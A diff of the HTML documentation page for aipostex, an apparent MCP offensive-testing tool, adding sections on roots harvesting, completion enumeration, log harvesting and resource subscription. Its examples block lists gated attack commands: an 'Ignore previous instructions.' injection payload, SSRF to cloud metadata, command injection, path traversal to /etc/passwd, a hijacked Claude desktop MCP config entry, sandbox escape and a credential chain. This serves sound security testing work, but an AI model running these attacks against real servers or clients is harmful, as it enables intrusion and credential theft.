@@ -2379,6 +2379,50 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#roots-harvesting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Roots Harvesting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#completion-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Completion Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#log-harvesting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Log Harvesting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resource-subscription" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resource Subscription
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#authorization-posture" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -4489,6 +4533,50 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#roots-harvesting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Roots Harvesting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#completion-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Completion Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#log-harvesting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Log Harvesting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resource-subscription" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resource Subscription
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#authorization-posture" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -4702,6 +4790,22 @@
 <td>Advertise the <code>elicitation</code> capability and detect a server that phishes the client's user (server-initiated <code>elicitation/create</code>)</td>
 </tr>
 <tr>
+<td><code>roots</code></td>
+<td>Advertise the <code>roots</code> capability and detect a server harvesting the client machine's filesystem roots (server-initiated <code>roots/list</code>)</td>
+</tr>
+<tr>
+<td><code>complete</code></td>
+<td>Enumerate server-side values through <code>completion/complete</code> (prompt + resource-template arguments)</td>
+</tr>
+<tr>
+<td><code>logging</code></td>
+<td>Raise the server log level (<code>logging/setLevel</code>) and capture the log output it pushes to clients</td>
+</tr>
+<tr>
+<td><code>subscribe</code></td>
+<td>Establish a <code>resources/subscribe</code> push channel onto a resource</td>
+</tr>
+<tr>
 <td><code>auth</code></td>
 <td>Probe the endpoint's authorization posture: anonymous access, OAuth metadata discovery, and open dynamic client registration</td>
 </tr>
@@ -4737,6 +4841,21 @@
 <td><code>--read</code></td>
 <td>No (<code>enum</code>)</td>
 <td>Also <strong>retrieve</strong> each resource (<code>resources/read</code>) and prompt (<code>prompts/get</code>), not just list them</td>
+</tr>
+<tr>
+<td><code>--tool</code></td>
+<td>No (<code>sampling</code>, <code>elicitation</code>, <code>roots</code>, <code>logging</code>, <code>env-extract</code>)</td>
+<td>Probe a single named tool instead of every enumerated one</td>
+</tr>
+<tr>
+<td><code>--level</code></td>
+<td>No (<code>logging</code>)</td>
+<td>Log level to request: <code>debug</code> (default), <code>info</code>, <code>notice</code>, <code>warning</code>, <code>error</code>, <code>critical</code>, <code>alert</code>, <code>emergency</code></td>
+</tr>
+<tr>
+<td><code>--uri</code></td>
+<td>No (<code>subscribe</code>)</td>
+<td>Resource URI to subscribe to (default: every listed resource)</td>
 </tr>
 </tbody>
 </table>
@@ -4899,6 +5018,28 @@
 <p>The <code>elicitation</code> subcommand (gated) advertises the <code>elicitation</code> client capability, invokes each tool (or a single <code>--tool</code>), and captures a server-initiated <code>elicitation/create</code> request using the same GET-event-stream machinery as <code>sampling</code>. A hit → <strong>High</strong>, <code>access</code> / <code>influenced</code>; aipostex never answers the prompt, so no user is actually phished — the finding confirms the <em>server's</em> behavior, not a victim's response. The request (its message + requested schema) is kept as raw evidence.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>elicitation<span class="w"> </span>--force-exploit
 </code></pre></div>
+<h2 id="roots-harvesting">Roots Harvesting<a class="headerlink" href="#roots-harvesting" title="Permanent link">&para;</a></h2>
+<p>MCP <strong>roots</strong> let a client tell a server which local directories it may work in. A malicious server flips that around: it issues <code>roots/list</code> to make the connected client disclose its filesystem layout — project directories, mounted shares, home paths. That is reconnaissance of the <strong>client machine</strong>, and like sampling and elicitation it only fires when a tool is invoked.</p>
+<p><code>roots</code> (gated) advertises the capability, invokes each tool (or <code>--tool</code>), and captures a server-initiated <code>roots/list</code> off the event stream. A hit → <strong>Medium</strong>, <code>access</code> / <code>influenced</code> — the server's harvesting behavior is confirmed, but aipostex never answers, so no path is actually disclosed.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>roots<span class="w"> </span>--force-exploit
+</code></pre></div>
+<h2 id="completion-enumeration">Completion Enumeration<a class="headerlink" href="#completion-enumeration" title="Permanent link">&para;</a></h2>
+<p><code>completion/complete</code> powers argument autocomplete for prompts and resource templates. A server that answers it will happily enumerate <strong>server-side values</strong> — account IDs, ticket numbers, usernames, file paths — that no <code>resources/list</code> or <code>prompts/list</code> call exposes. Autocomplete becomes a quiet enumeration primitive.</p>
+<p><code>complete</code> (read-only, no tool invoked) asks for the unfiltered value set of every declared prompt argument <strong>and every resource-template argument</strong>. Templates matter: they are served from <code>resources/templates/list</code>, which <code>resources/list</code> does not include, so a whole parameterized data surface (<code>records://customers/{account_id}</code>) is invisible to a plain enumeration — <code>enum</code> now lists them too. Values returned → <strong>Medium</strong>, <code>access</code> / <code>read-confirmed</code>, with the values as evidence.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span><span class="nb">complete</span>
+</code></pre></div>
+<h2 id="log-harvesting">Log Harvesting<a class="headerlink" href="#log-harvesting" title="Permanent link">&para;</a></h2>
+<p><code>logging/setLevel</code> lets a client choose how verbose the server is. If the server accepts it unauthenticated, an attacker turns the verbosity up and then reads whatever the server's debug output contains — backend URLs, arguments, identifiers, and not infrequently tokens.</p>
+<p><code>logging</code> (gated — it changes server state) sets the level (<code>--level</code>, default <code>debug</code>), then invokes tools and captures any <code>notifications/message</code> the server pushes. The level change being accepted → <strong>Medium</strong>, <code>access</code> / <code>influenced</code>; a captured log notification → <strong>Medium</strong>, <code>access</code> / <code>read-confirmed</code>, with the raw notification as evidence so any secret in it reaches the credential index.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>logging<span class="w"> </span>--force-exploit
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>logging<span class="w"> </span>--level<span class="w"> </span>debug<span class="w"> </span>--tool<span class="w"> </span>lookup_ticket<span class="w"> </span>--force-exploit
+</code></pre></div>
+<h2 id="resource-subscription">Resource Subscription<a class="headerlink" href="#resource-subscription" title="Permanent link">&para;</a></h2>
+<p><code>resources/subscribe</code> establishes a standing push channel: the server notifies on every change to a resource, with no repeated polling and no new request. Accepted without authorization, it is durable read access to changing internal data.</p>
+<p><code>subscribe</code> (gated — it writes server-side state) subscribes to every listed resource, or one given by <code>--uri</code>. Accepted → <strong>Medium</strong>, <code>access</code> / <code>influenced</code> (the subscription exists; a pushed update is not claimed unless observed). A server that does not implement the method is reported honestly as unsupported rather than as a failure.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>subscribe<span class="w"> </span>--force-exploit
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>subscribe<span class="w"> </span>--uri<span class="w"> </span>internal://ops/runbook<span class="w"> </span>--force-exploit
+</code></pre></div>
 <h2 id="authorization-posture">Authorization Posture<a class="headerlink" href="#authorization-posture" title="Permanent link">&para;</a></h2>
 <p>MCP's 2025 authorization spec layers OAuth 2.1 over the HTTP transport: the server is a <em>protected resource</em> (RFC 9728) that points at an authorization server (RFC 8414), and clients obtain audience-bound bearer tokens. In practice the common failures are (1) auth simply <strong>not enforced</strong> — the endpoint answers anonymous requests — and (2) <strong>open dynamic client registration</strong>, where anyone can mint an OAuth client.</p>
 <p>The <code>auth</code> subcommand probes all three, no token required:</p>
@@ -4907,66 +5048,66 @@
 <li><strong>Discovery</strong> — fetches <code>/.well-known/oauth-protected-resource</code> (or the <code>resource_metadata</code> URL from the challenge) and the authorization server's <code>/.well-known/oauth-authorization-server</code>, enumerating the issuer, endpoints, scopes, and any registration endpoint (<strong>Info</strong>, <code>recon</code>; raw metadata as evidence).</li>
 <li><strong>Open registration</strong> — if a registration endpoint is advertised, <code>--force-exploit</code> submits an unauthenticated RFC 7591 registration. A minted <code>client_id</code> means open DCR (<strong>High</strong>, <code>access</code> / <code>influenced</code>) — an attacker can self-provision clients. Without <code>--force-exploit</code> the endpoint is only reported, not exercised.</li>
 </ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>auth
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>auth<span class="w"> </span>--force-exploit<span class="w">   </span><span class="c1"># also tests open DCR</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>auth
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>auth<span class="w"> </span>--force-exploit<span class="w">   </span><span class="c1"># also tests open DCR</span>
 </code></pre></div>
 <h2 id="examples">Examples<a class="headerlink" href="#examples" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Analyze local config</span>
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>analyze<span class="w"> </span>--config<span class="w"> </span>~/.config/Claude/claude_desktop_config.json
-<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
-<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># Enumerate remote endpoint</span>
-<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>enum
-<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
-<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c1"># Generic poison probe (gated)</span>
-<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">  </span>--mode<span class="w"> </span>generic<span class="w"> </span>--tool<span class="w"> </span>fetch<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w">  </span>--payload<span class="w"> </span><span class="s2">&quot;Ignore previous instructions.&quot;</span><span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">  </span>--attempts<span class="w"> </span><span class="m">2</span><span class="w"> </span>--force-exploit
-<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
-<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="c1"># SSRF cloud metadata (gated)</span>
-<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="w">  </span>--mode<span class="w"> </span>ssrf-cloud<span class="w"> </span>--target-alias<span class="w"> </span>aws-imds<span class="w"> </span>--force-exploit
-<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>
-<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="c1"># Command injection (gated)</span>
-<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="w">  </span>--mode<span class="w"> </span>cmd-inject<span class="w"> </span>--command<span class="w"> </span>id<span class="w"> </span>--force-exploit
-<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>
-<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="c1"># Path traversal (gated)</span>
-<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="w">  </span>--mode<span class="w"> </span>path-traversal<span class="w"> </span>--path<span class="w"> </span>../../etc/passwd<span class="w"> </span>--force-exploit
-<a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>
-<a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a><span class="c1"># Full-schema poisoning: type field injection (gated)</span>
-<a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a><span class="w">  </span>--mode<span class="w"> </span>type-field<span class="w"> </span>--force-exploit
-<a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>
-<a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a><span class="c1"># Full-schema poisoning: default value injection (gated)</span>
-<a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a><span class="w">  </span>--mode<span class="w"> </span>default-value<span class="w"> </span>--payload<span class="w"> </span>/etc/passwd<span class="w"> </span>--force-exploit
-<a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>
-<a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a><span class="c1"># Environment variable extraction (read-only)</span>
-<a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>env-extract
-<a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a>
-<a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a><span class="c1"># Write a hijacked remote MCP config entry (gated)</span>
-<a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>config-hijack<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a><span class="w">  </span>--config<span class="w"> </span>~/.config/Claude/claude_desktop_config.json<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a><span class="w">  </span>--server<span class="w"> </span>aipostex-hijack<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a><span class="w">  </span>--url<span class="w"> </span>http://127.0.0.1:3000/mcp<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a><span class="w">  </span>--force-exploit
-<a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a>
-<a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a><span class="c1"># Filesystem sandbox escape (gated)</span>
-<a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>sandbox-escape<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a><span class="w">  </span>--allowed-prefix<span class="w"> </span>/data/documents<span class="w"> </span>--force-exploit
-<a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a>
-<a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a><span class="c1"># Server-side template injection (gated)</span>
-<a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>ssti<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a><span class="w">  </span>--tool<span class="w"> </span>render_report<span class="w"> </span>--arg<span class="w"> </span>report_data<span class="w"> </span>--force-exploit
-<a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a>
-<a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a><span class="c1"># Automated credential chain (gated)</span>
-<a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>chain<span class="w"> </span>--force-exploit
-<a id="__codelineno-4-53" name="__codelineno-4-53" href="#__codelineno-4-53"></a>
-<a id="__codelineno-4-54" name="__codelineno-4-54" href="#__codelineno-4-54"></a><span class="c1"># Chain targeting only AWS metadata</span>
-<a id="__codelineno-4-55" name="__codelineno-4-55" href="#__codelineno-4-55"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>chain<span class="w"> </span><span class="se">\</span>
-<a id="__codelineno-4-56" name="__codelineno-4-56" href="#__codelineno-4-56"></a><span class="w">  </span>--cloud<span class="w"> </span>aws<span class="w"> </span>--force-exploit
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Analyze local config</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>analyze<span class="w"> </span>--config<span class="w"> </span>~/.config/Claude/claude_desktop_config.json
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># Enumerate remote endpoint</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>enum
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1"># Generic poison probe (gated)</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w">  </span>--mode<span class="w"> </span>generic<span class="w"> </span>--tool<span class="w"> </span>fetch<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="w">  </span>--payload<span class="w"> </span><span class="s2">&quot;Ignore previous instructions.&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="w">  </span>--attempts<span class="w"> </span><span class="m">2</span><span class="w"> </span>--force-exploit
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="c1"># SSRF cloud metadata (gated)</span>
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="w">  </span>--mode<span class="w"> </span>ssrf-cloud<span class="w"> </span>--target-alias<span class="w"> </span>aws-imds<span class="w"> </span>--force-exploit
+<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>
+<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="c1"># Command injection (gated)</span>
+<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="w">  </span>--mode<span class="w"> </span>cmd-inject<span class="w"> </span>--command<span class="w"> </span>id<span class="w"> </span>--force-exploit
+<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>
+<a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a><span class="c1"># Path traversal (gated)</span>
+<a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="w">  </span>--mode<span class="w"> </span>path-traversal<span class="w"> </span>--path<span class="w"> </span>../../etc/passwd<span class="w"> </span>--force-exploit
+<a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>
+<a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a><span class="c1"># Full-schema poisoning: type field injection (gated)</span>
+<a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a><span class="w">  </span>--mode<span class="w"> </span>type-field<span class="w"> </span>--force-exploit
+<a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a>
+<a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a><span class="c1"># Full-schema poisoning: default value injection (gated)</span>
+<a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>poison<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a><span class="w">  </span>--mode<span class="w"> </span>default-value<span class="w"> </span>--payload<span class="w"> </span>/etc/passwd<span class="w"> </span>--force-exploit
+<a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a>
+<a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a><span class="c1"># Environment variable extraction (read-only)</span>
+<a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>env-extract
+<a id="__codelineno-8-35" name="__codelineno-8-35" href="#__codelineno-8-35"></a>
+<a id="__codelineno-8-36" name="__codelineno-8-36" href="#__codelineno-8-36"></a><span class="c1"># Write a hijacked remote MCP config entry (gated)</span>
+<a id="__codelineno-8-37" name="__codelineno-8-37" href="#__codelineno-8-37"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>config-hijack<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-38" name="__codelineno-8-38" href="#__codelineno-8-38"></a><span class="w">  </span>--config<span class="w"> </span>~/.config/Claude/claude_desktop_config.json<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-39" name="__codelineno-8-39" href="#__codelineno-8-39"></a><span class="w">  </span>--server<span class="w"> </span>aipostex-hijack<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-40" name="__codelineno-8-40" href="#__codelineno-8-40"></a><span class="w">  </span>--url<span class="w"> </span>http://127.0.0.1:3000/mcp<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-41" name="__codelineno-8-41" href="#__codelineno-8-41"></a><span class="w">  </span>--force-exploit
+<a id="__codelineno-8-42" name="__codelineno-8-42" href="#__codelineno-8-42"></a>
+<a id="__codelineno-8-43" name="__codelineno-8-43" href="#__codelineno-8-43"></a><span class="c1"># Filesystem sandbox escape (gated)</span>
+<a id="__codelineno-8-44" name="__codelineno-8-44" href="#__codelineno-8-44"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>sandbox-escape<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-45" name="__codelineno-8-45" href="#__codelineno-8-45"></a><span class="w">  </span>--allowed-prefix<span class="w"> </span>/data/documents<span class="w"> </span>--force-exploit
+<a id="__codelineno-8-46" name="__codelineno-8-46" href="#__codelineno-8-46"></a>
+<a id="__codelineno-8-47" name="__codelineno-8-47" href="#__codelineno-8-47"></a><span class="c1"># Server-side template injection (gated)</span>
+<a id="__codelineno-8-48" name="__codelineno-8-48" href="#__codelineno-8-48"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>ssti<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-49" name="__codelineno-8-49" href="#__codelineno-8-49"></a><span class="w">  </span>--tool<span class="w"> </span>render_report<span class="w"> </span>--arg<span class="w"> </span>report_data<span class="w"> </span>--force-exploit
+<a id="__codelineno-8-50" name="__codelineno-8-50" href="#__codelineno-8-50"></a>
+<a id="__codelineno-8-51" name="__codelineno-8-51" href="#__codelineno-8-51"></a><span class="c1"># Automated credential chain (gated)</span>
+<a id="__codelineno-8-52" name="__codelineno-8-52" href="#__codelineno-8-52"></a>./aipostex<span class="w"> </span>mcp<span class="w"> </span>--target<span class="w"> </span>http://127.0.0.1:3000<span class="w"> </span>chain<span class="w"> </span>--force-exploit
+<a id="__codelineno-8-53" name="__codelineno-8-53" href="#__codelineno-8-53"></a>
+<a id="__codelineno-8-54" name="__codelineno-8-54" href="#__codelineno-8-54"></a><span class="c1"># Chain targeting only AWS metadata</span>
